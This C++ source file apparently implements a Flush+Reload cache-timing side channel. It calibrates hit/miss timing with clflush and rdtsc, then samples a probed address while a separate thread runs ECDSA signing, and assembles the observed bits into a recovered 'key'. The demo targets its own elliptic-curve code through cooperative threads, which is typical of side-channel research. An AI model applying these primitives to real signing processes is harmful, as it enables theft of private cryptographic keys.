#include"spy.h"
void* addr_Pmul = (void*)&EllPoint::SpyMul;
void* addr_Padd = (void*)&EllPoint::Add;
void* addr_Pdoub = (void*)&EllPoint::Pdouble;
extern int Stop_spy =0;

inline void maceess(void* addr)
{
	asm volatile("mfence");
	asm volatile("movl (%0),%%eax \n" : :"c"(addr):"%eax");
	asm volatile("mfence");
}
inline void flush(void* addr)
{
	asm volatile("mfence");
	asm volatile("clflush 0(%0) \n" : :"c"(addr));
	asm volatile("mfence");

}
inline unsigned long long int rdtsc()
{
	unsigned long long int a=0;
	asm volatile("mfence");
	asm volatile("rdtsc" : "=A"(a));
	asm volatile("mfence");
	return a;
}
unsigned long long int get_FlushReload_time()
{
	unsigned long long int start,end,reload_time,flush_time;
	reload_time=0;
	flush_time=0;
	int a[16];
	void* addr=(void*)&access_test;
	unsigned long long int count =10000;
	maceess(addr);
	for(int i=0;i<count;i++)
	{
		start = rdtsc();
		maceess(addr);
		end = rdtsc();
		reload_time +=(end - start);
	}
	for(int i=0;i<count;i++)
	{
		flush(addr);
		start = rdtsc();
		maceess(addr);
		end = rdtsc();
		flush_time +=(end - start);
	}
    flush(addr);
	reload_time /=count;
	flush_time/=count;
	printf("reload:%llu,flush:%llu\n",reload_time,flush_time);
	return (reload_time+flush_time)/2;
}
bool __attribute((always_inline)) flush_reload(void* addr)
{
    unsigned long long int start,end;
	asm volatile("mfence");
    start = rdtsc();
	maceess(addr);
	end = rdtsc();
	asm volatile("mfence");
    flush(addr);
        //printf("%llu\n",end-start);
    if((end-start)<flush_reload_threshold)
    {
        return 1;
    }
    return 0;
}


void* spyth(void* arg)
{
		int i = 0;
		void* addr = (void*)&access_test;
		while(!Stop_spy)
		{
			pthread_mutex_lock(&mutex);
			while(alternate)
			{
				pthread_cond_wait(&cond,&mutex);
			}
			if(flush_reload(addr))
			{
				//printf("1 ");
				key[i]='1';
			}
			else
			{
				//printf("0 ");
				key[i]='0';
			}
			i++;
			flush(addr);
			if(i>500){break;}
			alternate =1;
			//printf("spyth %d\n  ",i);
			pthread_mutex_unlock(&mutex);
			pthread_cond_signal(&cond);
		}
		
		key[i]=0;
		return 0;
//	}
}
SignGen sign;
void* signth(void* arg)
{
	sign.Ecdsa_sign_gen("insada");
	//Stop_spy =1;
	return 0;
}

void Spytest()
{
	pthread_t spy_thread; 
	pthread_t sign_thread;
	flush_reload_threshold = get_FlushReload_time();
	
	pthread_create(&spy_thread,NULL,spyth, NULL);
	pthread_create(&sign_thread,NULL,signth, NULL);
	pthread_join(sign_thread,NULL);
	pthread_join(spy_thread,NULL);
	printf("\n%s\n",key);
	mpz_t mpz_key;
	mpz_init_set_str(mpz_key,key,2);
	mpz_printf(mpz_key);
	flush(addr_Pdoub);
	flush(addr_Padd);
}

